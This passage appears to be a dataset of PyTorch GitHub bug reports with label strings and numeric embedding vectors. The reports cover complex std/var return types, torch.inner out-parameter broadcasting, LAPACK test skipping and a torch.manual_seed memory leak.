  1.07323632e-01 -2.09779203e-01  4.46029082e-02 -2.09709734e-01
 -2.05271691e-02 -2.00144932e-01  1.11499518e-01  1.56416416e-01
 -1.62378568e-02 -1.36565715e-01 -2.45689616e-01  4.37306792e-01
  2.26628892e-02 -4.63655323e-01  5.45091406e-02 -5.30565605e-02
 -1.04329638e-01  1.94757745e-01 -2.32489593e-03  7.83326268e-01
  3.75182092e-01 -1.13560796e-01  1.64741397e-01 -1.19414441e-01
  2.81357735e-01  1.37774289e-01 -4.42986488e-02 -6.09070063e-02
  1.51666194e-01 -4.60102051e-01  1.98330462e-01 -2.12566033e-01
 -4.00663912e-01 -1.79719925e-01  3.41053486e-01  1.45923227e-01
 -2.13998437e-01 -1.52103454e-01 -3.57083470e-01 -1.80015951e-01
 -5.65272748e-01  1.56698927e-01  2.40784824e-01 -8.26796293e-02
 -5.34614399e-02 -2.86194682e-01  1.32062808e-01 -1.62644610e-01
  1.50551245e-01  3.42555344e-01  6.62747249e-02  1.85709178e-01
  9.32959542e-02  3.58048677e-01  6.91990480e-02  1.62700303e-02
 -1.13585189e-01  1.96153283e-01 -4.98595446e-01 -3.26196849e-01
  3.65225464e-01 -1.89856678e-01 -3.32507730e-01  2.16040730e-01
  1.53887108e-01 -2.57268727e-01  4.51075852e-01 -5.78596704e-02
  1.98213384e-02 -2.96372801e-01  3.64757061e-01  4.09555852e-01
 -1.75281286e-01 -2.07704067e-01 -1.09029032e-01  3.63840759e-01
  9.77403671e-02 -4.93380427e-01 -5.57563484e-01  5.54721832e-01
 -9.96597335e-02  1.48898065e-01 -3.33267927e-01  6.34960039e-03
  5.49715459e-02 -4.79594171e-02 -1.67669117e-01 -1.90054119e-01
  7.10830092e-02 -2.76932791e-02  1.56559497e-01  1.75730750e-01
 -2.71890610e-02  1.72776524e-02  1.20808467e-01  1.89802945e-01
  1.76823825e-01 -1.39894545e-01 -7.43715167e-02 -2.13784397e-01
 -1.28754154e-02 -3.49161655e-01 -2.83205241e-01 -4.19199049e-01
  3.74672413e-02 -8.97392482e-02 -9.40471739e-02  1.34184092e-01
  3.30050826e-01 -5.39344102e-02 -4.73524071e-03  4.57319826e-01
 -3.35676968e-01  1.09730744e+00 -2.81567574e-01 -3.00357863e-02
  5.41680515e-01  2.12827548e-01  3.32732320e-01 -1.80027097e-01
  9.45966840e-02  4.05513227e-01 -5.26285581e-02 -4.23879206e-01
  1.51632249e-01 -1.95644870e-02 -4.23119575e-01  3.31753120e-02
 -3.21598172e-01  3.14636976e-02 -5.44661283e-01 -7.40132704e-02
 -9.83611494e-03 -4.96330529e-01  2.63353661e-02 -1.53465956e-01
 -4.66982275e-02 -2.59478688e-01  1.47613913e-01 -1.45716071e-01
  1.52140960e-01  3.97979528e-01  3.47402811e-01 -1.76402956e-01
 -3.82657915e-01  1.42778754e-01 -9.54620838e-02 -2.15401649e-01
  4.88732278e-01  1.54017121e-01 -4.24073577e-01  5.74298538e-02
  1.51455879e-01  5.10831714e-01  3.54595900e-01  2.69778788e-01
  1.60381913e-01 -1.66622043e-01  5.18996827e-03 -1.16735194e-02
 -1.48614749e-01  1.78306490e-01  1.44496441e-01  3.31840336e-01
 -7.88127258e-02 -2.15212792e-01 -1.87480852e-01 -1.62848383e-01
  1.41078949e-01 -6.84377253e-02 -7.66569376e-02 -2.19322473e-01
 -3.01959276e-01  1.26705132e-02 -1.15434736e-01  3.13954279e-02
 -2.90215492e-01  5.27406216e-01  1.88517943e-01  2.17975020e-01
  1.75332710e-01 -1.33231223e-01 -1.41871423e-01 -7.75421038e-02
  2.80902803e-01  3.90532434e-01 -6.95791095e-02 -2.97015607e-01
 -2.64764696e-01 -8.44881497e-03  2.21308738e-01 -8.30224305e-02
  5.69122657e-02  8.63840878e-02 -5.30982949e-02  1.11281186e-01
 -3.13349992e-01  1.07862897e-01 -6.03543758e-01  2.38671154e-02
 -2.26283908e-01 -2.29036182e-01 -3.60412240e-01 -5.58885895e-02
 -9.78984088e-02  3.20721418e-03  2.21245378e-01  1.45157874e-01
 -3.52868795e-01  1.39916867e-01 -1.12942122e-01 -1.66858271e-01
  4.74699408e-01 -4.27122638e-02  1.49217039e-01  6.05896831e-01
  3.46543193e-01 -6.67732805e-02  1.84708774e-01 -2.53692091e-01
 -1.83571577e-01  4.12586510e-01  2.02830248e-02  2.45005429e-01
  1.33518666e-01 -9.92786139e-02 -1.22032508e-01  1.65545970e-01
 -1.88668311e-01 -2.12170392e-01  2.16575176e-01 -7.01591313e-01
  1.73122287e-01 -1.20681850e-03  4.88698065e-01 -2.81876445e-01
  6.88266993e-01  6.79333061e-02 -4.68790941e-02 -2.92082757e-01
  4.21552449e-01  4.20403004e-01  1.56745374e-01  2.35320851e-01
  5.39414883e-01 -2.42205411e-01 -3.04768831e-01 -4.49809194e-01
 -9.50704068e-02 -9.49317515e-02 -2.02790648e-01 -5.40558249e-04
  5.00328362e-01  3.28824997e-01  3.74876320e-01  1.03462666e-01
  3.05612236e-01 -2.90787816e-01 -8.91623944e-02  3.95815849e-01
 -7.65302420e-01 -1.15475766e-02  1.50176033e-01 -1.75758779e-01
 -3.13582212e-01  9.71529633e-02 -2.57827938e-02  2.11982846e-01
  4.30699944e-01 -5.94302595e-01  4.60648775e-01  2.79968798e-01
 -5.44579402e-02  2.71650225e-01 -4.47495729e-01  4.08726186e-02
 -3.56518030e-02  5.27858019e-01  2.71368116e-01 -4.03504819e-03
 -5.66947460e-02 -3.49247277e-01 -2.90433705e-01  1.80993542e-01
  2.61274099e-01  1.93838805e-01 -5.15433013e-01 -2.94050276e-01
  8.50820839e-02  1.83891922e-01  3.19415987e-01  1.25637501e-01
  1.66924790e-01 -1.23639919e-01  3.46741080e-01 -2.58191586e-01
 -4.01257016e-02  9.74087045e-02  1.68861836e-01 -1.27069294e-01
 -2.47121140e-01 -1.60425827e-01  1.51644498e-02  7.57100582e-02
 -1.27503946e-01 -4.20464873e-01  2.67284691e-01  7.29210973e-01
 -2.27048285e-02 -4.81957614e-01  1.43482313e-01 -9.68203843e-02
 -2.35124588e-01 -1.83082223e-01 -3.11240077e-01  3.96976501e-01
 -4.80106771e-01  1.55010641e-01  2.09906295e-01 -1.70264859e-02
 -6.61927581e-01 -2.67725408e-01 -6.24185920e-01 -1.42686337e-01
  8.45212787e-02 -7.92207420e-02 -3.19445431e-01  3.09793770e-01
  2.07633972e-01  2.18082756e-01 -3.13900918e-01  1.76050261e-01
  1.00441277e-03  5.37541866e-01  3.62143129e-01  1.50010616e-01
  5.19603014e-01 -9.08901542e-02  2.66159236e-01 -1.79023102e-01
  1.60221502e-01  2.83839017e-01 -1.22317076e-01 -4.43554640e-01]"
torch.std/var of complex should return a real result module: bc-breaking triaged module: complex module: numpy,"## ðŸ› Bug

In NumPy `std` and `var` of complex arrays returns a real result, but `torch.std`/`var` return a complex tensor with zero imaginary component.

## To Reproduce

Need to pass dim=0 needed because of #51127
```python
>>> import torch
>>> torch.rand(100, dtype=torch.complex128).var(dim=0).dtype
torch.complex128
>>> torch.rand(100, dtype=torch.complex128).std(dim=0).dtype
torch.complex128
```

Compare to NumPy:
```python
>>> import numpy as np
>>> np.random.rand(100).astype(complex).var().dtype
dtype('float64')
>>> np.random.rand(100).astype(complex).std().dtype
dtype('float64')
```

## Environment

I've confirmed it's worked like this since at least PyTorch 1.6.

```
PyTorch version: 1.8.1
Is debug build: False
CUDA used to build PyTorch: 11.1
ROCM used to build PyTorch: N/A

OS: Pop!_OS 20.10 (x86_64)
GCC version: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
Clang version: 11.0.0-2
CMake version: version 3.16.3

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 11.1.105
GPU models and configuration: GPU 0: GeForce RTX 2060 SUPER
Nvidia driver version: 460.67
cuDNN version: Probably one of the following:
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_adv_infer.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_adv_train.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_cnn_infer.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_cnn_train.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_ops_infer.so.8.0.4
/usr/lib/cuda-11.1/targets/x86_64-linux/lib/libcudnn_ops_train.so.8.0.4
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.2
[pip3] torch==1.8.1
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               11.1.1               h6406543_8    conda-forge
[conda] mkl                       2020.2                      256  
[conda] numpy                     1.20.2           py38h9894fe3_0    conda-forge
[conda] pytorch                   1.8.1           py3.8_cuda11.1_cudnn8.0.5_0    pytorch
```


cc @ezyang @gchanan @anjali411 @dylanbespalko @mruberry @rgommers @heitorschueroff",True,"[-4.14985567e-01  6.85235560e-02 -2.52225518e-01  2.37415098e-02
 -2.34472007e-01 -4.73709643e-01 -2.34899193e-01  2.13068694e-01
 -4.75540578e-01  2.55054329e-03 -2.55524635e-01 -1.69994399e-01
 -2.74540991e-01  2.42338166e-01  2.25487471e-01  4.50170785e-02
 -3.65304947e-01 -4.49848585e-02 -1.68262035e-01  1.56092063e-01
  1.60495445e-01 -1.07062772e-01 -1.32935286e-01 -1.29548106e-02
 -2.23883800e-03  1.42795891e-01  1.56319872e-01 -4.40056287e-02
  5.85770845e-01 -1.08818531e-01  1.46366462e-01 -8.21978785e-03
 -3.57988298e-01  2.31169522e-01  3.92659288e-03  1.03118636e-01
 -4.70331758e-01 -1.06641904e-01  7.02423677e-02  4.39183339e-02
  2.43930265e-01  3.41320664e-01  1.47570014e-01 -5.03927097e-02
 -4.71860096e-02  5.63421696e-02 -1.84052050e-01  7.99312741e-02
 -1.36527181e-01 -2.01056436e-01 -3.59159857e-02  2.32115671e-01
 -2.79837251e-02 -1.01359308e-01 -9.27276611e-02 -4.57784861e-01
 -2.53404915e-01 -3.67634654e-01  1.36866421e-01 -5.39989114e-01
  3.71848851e-01  1.51066855e-01  2.22525567e-01 -2.47480959e-01
 -2.10377146e-02  3.85293067e-02  1.07792035e-01  1.69969201e-01
  6.67491555e-01 -1.16014808e-01  2.53859162e-01  2.05979496e-02
 -1.97669998e-01  4.53658216e-02 -3.01008761e-01  4.48309630e-02
 -2.77848244e-01  2.31567100e-01 -1.56425774e-01  7.02652261e-02
  1.34569839e-01  3.19239646e-02  1.42507762e-01 -1.21075787e-01
  6.29571974e-02  5.27230352e-02  5.36549568e-01 -3.13704640e-01
  5.50191164e-01  2.39582300e-01 -1.34169564e-01  1.99433237e-01
 -2.69779801e-01  1.57893732e-01 -4.37000021e-02  5.51501811e-02
  6.80103064e-01 -2.79532790e-01 -2.44182885e-01 -2.44371936e-01
 -2.40268856e-01 -3.68833035e-01 -2.44597390e-01  2.43804418e-03
  2.00597659e-01  3.10736671e-02  1.10180005e-01  2.14741781e-01
  3.38044882e-01 -1.77533984e-01  3.29230458e-01  2.27523983e-01
  1.16891675e-01 -1.85071439e-01 -1.07336164e-01 -2.65885800e-01
 -2.73679495e-01  1.79607660e-01 -2.23577425e-01  4.23805594e-01
  8.77326727e-02  1.88476190e-01 -5.05471304e-02  2.86430657e-01
  5.10185599e-01 -2.08899863e-02 -1.73341081e-01  2.50767842e-02
 -8.16922784e-02  1.29105225e-01 -4.03420068e-03  1.35257944e-01
 -5.57286218e-02  3.55332606e-02  5.32086730e-01  1.95955709e-01
 -4.33773279e-01  1.11829519e-01 -3.22441220e-01 -2.03784287e-01
 -1.50411278e-01 -6.57116920e-02 -2.46174455e-01 -3.60879242e-01
  2.86064655e-01 -3.50441337e-01 -4.36868787e-01 -5.16528357e-03
  3.63295302e-02  2.49470770e-01 -5.41566908e-02  1.15653276e-02
 -4.90358591e-01  1.41409606e-01  2.02484861e-01  6.55888170e-02
  1.45425156e-01  3.18549499e-02  1.66500717e-01 -3.79452884e-01
  3.67767662e-01  4.17608559e-01  5.11732936e-01  8.80486146e-03
  6.72198012e-02  3.10074333e-02 -1.76993594e-01  4.39134846e-03
 -4.94361609e-01  2.57181317e-01 -2.42281556e-01 -1.65936708e-01
 -1.03529021e-01  1.14172958e-01  3.88740391e-01 -2.32906520e-01
 -3.08751971e-01 -7.14582682e-01 -6.26854748e-02  6.39795184e-01
  3.52859914e-01  2.41224319e-01  4.54088569e-01 -1.21590167e-01
  2.65532225e-01 -8.09021294e-05  3.75246406e-01  1.66462421e-01
 -3.01278085e-01 -1.11120231e-01 -3.96008313e-01 -2.88120866e-01
 -1.36954203e-01 -2.77951330e-01 -1.19365277e-02  1.38215184e-01
  3.10080647e-02 -1.92013413e-01  3.87170874e-02  8.24499950e-02
 -4.57018018e-01 -3.68554890e-01 -1.04516938e-01  7.90878609e-02
  2.06759423e-01 -4.81897928e-02 -2.19032452e-01 -3.85547101e-01
 -2.47704595e-01  1.57787859e-01 -3.88325393e-01 -2.07957253e-01
  4.85362671e-02 -4.45671640e-02 -2.12158076e-02  3.01686730e-02
 -2.23882478e-02 -1.89181268e-01 -1.30131766e-01  3.50500613e-01
  4.63677466e-01 -6.68510273e-02 -5.53527623e-02 -2.55373091e-01
 -9.87503119e-03  1.39644086e-01 -4.84336287e-01 -9.72724929e-02
 -1.68503851e-01 -1.30432561e-01  4.73589860e-02 -3.42803806e-01
  2.62707591e-01  1.59303159e-01 -2.01958623e-02  4.06675667e-01
 -2.07921565e-01 -1.42927244e-01 -2.50268966e-01  3.00207287e-02
 -1.35497093e-01 -5.05342633e-02  1.36937231e-01 -1.05047002e-01
 -9.86870192e-03  5.54298997e-01 -3.59696150e-01 -1.88811064e-01
 -2.01147690e-01  3.80356193e-01 -1.17479742e-01  8.95897597e-02
 -2.36144871e-01 -2.57180929e-01  3.58507007e-01 -1.69767827e-01
  1.24699682e-01  1.77548632e-01 -2.59671304e-02 -1.83103740e-01
  1.26384407e-01  1.12157211e-01  1.90872271e-02  2.30804887e-02
  1.60687253e-01 -4.59870808e-02 -1.61526337e-01  4.07986492e-01
  1.05247647e-01 -4.56379876e-02  7.76468441e-02 -1.42004371e-01
  7.00328827e-01  1.36836022e-01  2.20165282e-01 -4.27719444e-01
  3.78064752e-01 -1.66692957e-02 -1.81633562e-01 -5.27125120e-01
  1.34537026e-01  1.63411498e-01 -2.24683821e-01  4.14821386e-01
  1.99979067e-01 -5.07691443e-01  2.74832249e-02  8.28259885e-02
 -1.95042148e-01 -7.49852061e-02 -3.39944005e-01 -1.39313728e-01
  3.86841774e-01 -3.76173794e-01 -9.86496285e-02  1.83880270e-01
  1.55310720e-01 -1.97287604e-01  2.71092802e-02  2.49645039e-01
 -1.27933219e-01  1.75031796e-01  4.27361459e-01 -8.38390365e-03
  1.58499017e-01 -1.58556253e-01  2.16114521e-01 -1.32224560e-01
  5.56386948e-01 -1.31657034e-01  7.04573244e-02 -2.13558212e-01
 -3.09310198e-01  3.82318586e-01 -1.05289668e-01  2.76246428e-01
 -1.02008104e-01  1.42707035e-01  3.60719979e-01 -4.47518155e-02
 -5.24969697e-02 -1.60952002e-01 -5.03237605e-01 -1.04159735e-01
  1.86368171e-02 -9.49780196e-02 -4.10068870e-01 -4.31048982e-02
  5.99834137e-02  4.91496682e-01  8.83079171e-02  1.16746239e-02
  1.22281507e-01  3.04984629e-01  1.82990327e-01 -3.47282827e-01
 -1.55827999e-01  2.48144418e-01 -1.02777611e-02 -2.53931820e-01
 -3.09749395e-01 -5.52673899e-02 -4.74016275e-03  1.54662533e-02
 -1.35154977e-01 -1.16180182e-01  4.53543156e-01  1.71191484e-01
 -9.68327746e-02  2.57478300e-02 -2.00541504e-02  7.39230812e-02
 -1.95270970e-01  5.53908169e-01  3.50516558e-01  3.59492570e-01
  1.80894732e-01  2.41955504e-01  1.83707014e-01  3.59409899e-01
  9.22998041e-02  4.97119635e-01 -4.95953083e-01 -8.37970674e-02
 -4.09998074e-02 -2.80515701e-01 -2.20262371e-02 -2.23136008e-01
  8.07451755e-02  2.12290019e-01 -5.54146767e-02  1.86865985e-01
 -1.89230233e-01  5.38954377e-01  4.79927897e-01 -3.05947512e-01
 -2.41436675e-01  9.86711085e-02 -6.85401559e-02  5.54746948e-03
  4.43526864e-01  1.36482894e-01 -4.43480685e-02 -6.73533678e-02]"
Out variant of torch.inner incorrectly broadcasts triaged module: numpy module: linear algebra module: correctness (silent),"## ðŸ› Bug

Per title

Currently, we directly `copy_` the result into the output tensor.
https://github.com/pytorch/pytorch/blob/d490e0120f32dcbb8b23e11eebd638b96b4b0898/aten/src/ATen/native/Linear.cpp#L644
If the output tensor can be broadcasted from result, it would generate wrong output.

## To Reproduce

```py
>>> a = torch.randn(5)
>>> b = torch.randn(5)
>>> torch.inner(a, b)
tensor(-4.2595)
>>> c = torch.randn(2)
>>> torch.inner(a, b, out=c)
tensor([-4.2595, -4.2595])
```

## Expected
```py
>>> a = torch.randn(5)
>>> b = torch.randn(5)
>>> torch.inner(a, b)
tensor(-4.2595)
>>> c = torch.randn(2)
>>> torch.inner(a, b, out=c)  # c should be resized to shape([1])
tensor([-4.2595])
```

cc @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk @rgommers",True,"[-0.45366806 -0.28168586 -0.33337077  0.03634418 -0.08248399 -0.13667718
  0.00571105  0.09931691 -0.41268378 -0.3082927   0.0094376   0.10203788
 -0.46209672  0.00737924 -0.02469726 -0.1248811  -0.2547492   0.0982148
 -0.14843144 -0.24815348  0.0308423  -0.08653195 -0.35497528  0.00170325
  0.14682722  0.20421043 -0.04881415 -0.30781317  0.13459165  0.05942162
  0.15726867  0.07503738 -0.23262937  0.09074445  0.02070088  0.42593494
 -0.21433115  0.02472614 -0.21686351  0.10576057  0.194112    0.38815448
  0.13487293  0.06248952 -0.08906104  0.04383001 -0.01182461 -0.05394598
  0.01669869 -0.22412026 -0.17515829  0.17365512 -0.190685   -0.14524178
  0.09934378 -0.40413713  0.11894927  0.11488153  0.1426745  -0.31816694
  0.10824117 -0.15455528 -0.12493362  0.02620149  0.16131365 -0.07800805
  0.33436087 -0.00126539  0.35860473  0.04525377  0.00300158  0.04271655
 -0.15136723  0.00417196  0.02139049  0.09036335 -0.14247124  0.35142812
  0.24074502 -0.17219207  0.14425528 -0.03759106  0.12699115 -0.16710548
 -0.05766171  0.16042343  0.14173737  0.10514196  0.39939    -0.3722436
  0.46810922 -0.21883234  0.18093312  0.28611317  0.00455238  0.15814549
  0.4074446   0.00485976 -0.14303176 -0.19684952 -0.36972466 -0.45291293
 -0.3688013   0.20100811  0.00829567 -0.10267803  0.13944848  0.06023944
  0.19711612 -0.18030176  0.4249782   0.04927143  0.01896359  0.10550622
  0.20748684 -0.2946844   0.01206149  0.11515541  0.03116763  0.34803078
 -0.13747913  0.04217752 -0.10527553  0.49426234  0.29762185  0.15416133
 -0.00564609  0.27843738  0.03890143  0.16730472  0.19216493 -0.06498109
 -0.03461091 -0.04014888  0.11775135  0.08453628 -0.1746003   0.00419499
 -0.04282214 -0.28823096 -0.25762665  0.15798898 -0.26343983 -0.14290881
  0.2508372   0.0194803  -0.25716576 -0.05848392  0.09397532  0.50499296
 -0.08178095  0.05423298 -0.24642442  0.34313056  0.1456869   0.18931076
  0.05813553 -0.04607198  0.092804   -0.5829537   0.2992221   0.41125977
  0.24065158  0.07018752  0.33543134  0.05407801 -0.46420863 -0.3660453
 -0.18159506  0.18061234 -0.12833133 -0.14241496 -0.3774037   0.06174872
  0.02341725 -0.25260523 -0.04392504 -0.64200026 -0.08533081  0.55234814
  0.22329366  0.31825647  0.5565368   0.29875624 -0.01605649  0.31802464
  0.5072603  -0.08724712 -0.3466568  -0.04853221 -0.23170263 -0.2858371
  0.16895285 -0.11814335 -0.15161878 -0.02818913  0.27770472 -0.15996696
 -0.29429734 -0.04928761 -0.08514734  0.05899982  0.24804083 -0.15108478
  0.1825053  -0.30614412 -0.11786532 -0.42993286 -0.41903222  0.27456164
 -0.1467072  -0.18590423 -0.11052332 -0.19787443 -0.20170031  0.3057108
 -0.14802404  0.18706793 -0.23856387  0.41373998  0.20048343 -0.05884659
 -0.17902046 -0.5562919  -0.05138021 -0.18716516 -0.4991437  -0.141175
 -0.12512235  0.04294512 -0.06265336  0.05226302  0.20504612  0.15287292
  0.35820317  0.18921232 -0.20086348 -0.08638664  0.17176616  0.24740885
 -0.33557054 -0.02100386  0.03277125 -0.07698433 -0.29260615  0.17330667
 -0.19609323  0.1386115  -0.13012262  0.3835057   0.03097158  0.11005962
 -0.2808185  -0.0175218   0.38954487 -0.10074447  0.02989279  0.15549354
 -0.01669895 -0.10544588  0.4640196   0.01489267 -0.18021716  0.33043033
  0.10659941  0.45505247 -0.01934802  0.71258265 -0.07448682 -0.07273945
  0.10275984 -0.12355385  0.16746137 -0.12891002 -0.0631635  -0.516535
  0.27498496  0.05030621 -0.42063373 -0.05756359  0.08701606  0.21882588
 -0.15620556  0.38383254  0.2754658  -0.5508792  -0.14621553 -0.3295139
  0.01301757 -0.13495466 -0.46534395  0.05669536  0.6259624  -0.15103541
 -0.33809793  0.137965    0.22822031  0.23118426  0.10544354  0.34905636
 -0.07587737  0.040603    0.07560273 -0.15515316 -0.2258816  -0.19835547
  0.19148308  0.18663144  0.77883375 -0.24552375  0.34226194 -0.043686
  0.02347387  0.29085118  0.05940153  0.01565282 -0.16027454  0.37221622
  0.36136463 -0.17227824 -0.0508581  -0.31537655 -0.45419464 -0.07650178
  0.0859291   0.12672067 -0.15058108 -0.3580187  -0.25333878  0.09040145
 -0.17073832 -0.17446023 -0.27306944  0.21344921 -0.01595729  0.00547483
 -0.103103    0.34777486 -0.01296101 -0.33099252 -0.05763669  0.0102191
  0.14975742 -0.06518954 -0.1939553  -0.38062745  0.3882742   0.00332628
 -0.03273745  0.18010508 -0.31818157  0.21983613 -0.07275015  0.33808747
  0.07766192  0.5941367   0.10634568  0.24967982  0.2100184   0.510058
 -0.04813354  0.14117427 -0.4149365   0.09366503  0.2535029  -0.26317617
  0.21465439 -0.3577719  -0.09199739  0.35558242 -0.07181124  0.38177103
 -0.09731092  0.17730041  0.5082526  -0.54146516 -0.01278923  0.07553205
 -0.41157627 -0.15114807  0.09968923  0.3175584  -0.08253396 -0.03701304]"
Test suite doesn't skip geqrf (and other tests) when LAPACK isn't available triaged module: linear algebra module: testing,"```
======================================================================
ERROR: test_geqrf_meta_float32 (__main__.TestTensorDeviceOpsMETA)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_utils.py"", line 1030, in wrapper
    method(*args, **kwargs)
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_device_type.py"", line 297, in instantiated_test
    raise rte
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_device_type.py"", line 292, in instantiated_test
    result = test_fn(self, *args)
  File ""/data/users/ezyang/pytorch-tmp/torch/testing/_internal/common_device_type.py"", line 595, in dep_fn
    return fn(slf, device, *args, **kwargs)
  File ""test/test_torch.py"", line 7383, in fn
    cpu_result = getattr(cpu_tensor, op_str)(*cpu_args)
RuntimeError: geqrf: Lapack library not found in compile time
 at /data/users/ezyang/pytorch-tmp/aten/src/TH/generic/THLapack.cpp:40
```

This should be a skip not a fail.


cc @jianyuh @nikitaved @pearu @mruberry @heitorschueroff @walterddr @IvanYashchuk",True,"[-0.84597874  0.07855019 -0.41286984 -0.3500129  -0.30269536 -0.35279056
 -0.24570508  0.161452   -0.3179041  -0.77784383  0.41114372 -0.3989808
  0.22686817 -0.11436622  0.3189695  -0.7018531  -0.30514342 -0.4767318
  0.0592981   0.00618058 -0.5159975  -0.24480234 -0.36029893  0.12720132
 -0.15437591 -0.1025687  -0.10060959  0.01355498  0.20541213  0.4978093
  0.36240357  0.3635446  -0.5267912  -0.01944041  0.52785957  0.39871323
  0.22795197 -0.03309695 -0.30569673  0.15583864 -0.22753757 -0.37331527
  0.47600484  0.01501472  0.85077894 -0.18345462 -0.09682445  0.08317912
  0.22941686  0.05274648  0.10960479  0.07775456  0.37126726 -1.0363905
 -0.17308865  0.21491754  0.27661744 -0.13093805 -0.13953334 -0.33028385
  0.0499749   0.4052924  -0.48400694  0.28668392  0.32856017  0.14067364
  0.06382672 -0.4163764   0.819359    0.2589994   0.25721264 -0.2892517
 -0.35537824 -0.23113587 -0.27327138  0.15021515  0.09145312 -0.47367465
  0.11565615 -0.00835335  0.01809532 -0.5823568  -0.11067528 -0.60495853
  0.19027124 -0.21252747  0.6715649   0.12151817  0.55639035 -0.2708438
  0.9203283   0.14905143 -0.23057978  0.24785349 -0.16432083  0.49227732
  0.0962825  -0.3236668  -0.36743522 -0.2251696   0.08860575 -0.05911509
 -0.25424004  0.5201347  -0.5663671  -0.06356524  0.35785103 -0.36000118
  0.16840743 -0.2329329  -0.0809761   0.0778271   0.19093305 -0.14216277
  0.18864538  0.3762958  -0.45248544  0.19167404  0.5067959   0.328805
 -0.40719366 -0.06654549  0.42690742 -0.35526946  0.552156   -0.378182
 -0.24998608  0.9494972  -0.02603767 -0.14205426 -0.05044018 -0.20213874
  0.38788575  0.21586435 -0.02886782  0.20143011 -0.06316809  0.22846462
  0.3363477  -0.24795702 -0.2805276  -0.3469739   0.02488952 -0.17903873
  0.10629261 -0.37767684 -0.75034225 -0.03389479 -0.35240918 -0.24986956
  0.24227758  0.29994106  0.33944967  0.08185345  0.44322145  0.16961342
  0.204513    0.06745425 -0.05462827 -0.16231911 -0.3548474   0.31145543
  0.36046308  0.39897275  0.6450803   0.20687675 -0.4761638   0.03861244
 -0.17055768  0.09374937  0.57759583 -0.02315212  0.43167588 -0.4581821
  0.3478843  -0.17355879 -0.0265597  -0.4810082  -0.14039923  0.8162277
 -0.16921368  0.27343354  0.60579646  0.36216813  0.29711646  0.3302089
  0.30552775  0.12973969  0.00899916 -0.04623986 -0.379925   -0.20406008
 -0.50230074  0.04206626 -0.4165156  -0.42634237  0.55398643  0.0581027
  0.2501842   0.2950971  -0.3771841   0.04461028  0.3623798  -0.32265666
  0.1992619   0.2553587   0.5609554  -0.3862443  -0.0483948   0.38873056
  0.18322808 -0.2943638  -0.19521949 -0.25650707 -0.15840542  0.23407431
  0.19044769 -0.6901491  -0.30965936  0.23520005  0.3420443  -0.56407756
 -0.04907814 -0.9581807  -0.2638896   0.04238044 -0.24661429 -0.26810437
  0.2833237  -0.5428645   0.35182387 -0.38195485  0.3678651   0.09564707
  0.17929003 -0.21703255 -0.01486318 -0.44053236  0.1634993  -0.15836221
 -0.41861057 -0.49686927 -0.29035878 -0.11998058  0.6563875   0.7407584
  0.16571593  0.07197449 -0.23083082 -0.03078108 -0.32472047  0.17577821
  0.03982446  0.17282873  0.58237934 -0.1562061   0.09230471  0.5154431
 -0.03252409 -0.04057442  1.0715449   0.42384124 -0.16653699 -0.00418724
  0.5566729   0.3591533  -0.00704603  0.5221282  -0.324219    0.0690553
  0.9049494  -0.45259428  0.5086213  -0.14341944 -0.21525955 -0.45405743
  0.17130347  0.18696015 -0.4903652  -0.336128   -0.30973357  0.11885518
 -0.43338412  0.38703465  0.19026412 -0.07073725  0.20439969 -0.21594173
  0.01019081 -0.30111057 -0.35320377  0.507639   -0.45039636  0.02269401
 -0.49277633  0.04820171  0.34950984 -0.29225388  0.353445    0.08892761
 -0.12279462 -0.0823843   0.5726497  -0.7061066  -0.0691997  -0.33106598
  0.28973705  0.53442615  0.41106966 -0.25945044  0.25760728 -0.27906665
 -0.16146994  0.30906203  0.20424071  0.16591953 -0.42647648  0.31796616
  0.34618214 -0.39913708  0.00999959  0.21505961 -0.744933   -0.16577555
  0.07988413  0.3121463  -0.6124182  -0.8429711   0.4776208   0.24037969
 -0.3616487  -0.03385541 -0.16312692 -0.26654908 -0.28166178  0.40071774
 -0.36694592  0.832288    0.01102101 -0.27313435  0.01683864  0.6015781
  0.13270666  0.08929109 -0.39416254  0.22287607  0.0218912   0.24416408
 -0.15401945 -0.07982619 -0.13140549  0.1381809  -0.2342749  -0.1380088
  0.5742656   0.33858585  0.5747683  -0.14564085  0.5741757   0.36467692
 -0.02870929 -0.1555357  -0.4226302  -0.12967922 -0.06583115  0.02666408
  0.02467748 -0.12384541  0.00314288  0.19143808 -0.3182452   0.28436667
 -0.26288128 -0.40160328  0.8305291  -0.37258896  0.02249096 -0.15895846
  0.36297363  0.06893531  0.32305115 -0.1811012   0.7079756   0.34889683]"
torch.manual_seed leaks memory high priority module: memory usage triaged module: random,"## ðŸ› Bug

Calling `torch.manual_seed(...)` (or `torch.cuda.manual_seed_all(...)`) leaks memory, quite a bit in fact. I am resetting the seed in my data loader for each sample and over the course of a few hours there are tens of gigabytes that are being leaked.

## To Reproduce

```
for i in range(1000000000): torch.manual_seed(i)
```

And watch the memory consumption of the process slowly creep up.

## Expected behavior

The memory consumption to remain constant, as is the case with `for i in range(1000000000): random.seed(i)`.

## Environment

```
PyTorch version: 1.8.1+cu102
Is debug build: False
CUDA used to build PyTorch: 10.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 20.04.2 LTS (x86_64)
GCC version: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
Clang version: 10.0.0-4ubuntu1 
CMake version: version 3.19.6

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: GeForce GTX 1650
Nvidia driver version: 460.39
cuDNN version: Could not collect
HIP runtime version: N/A
MIOpen runtime version: N/A
```


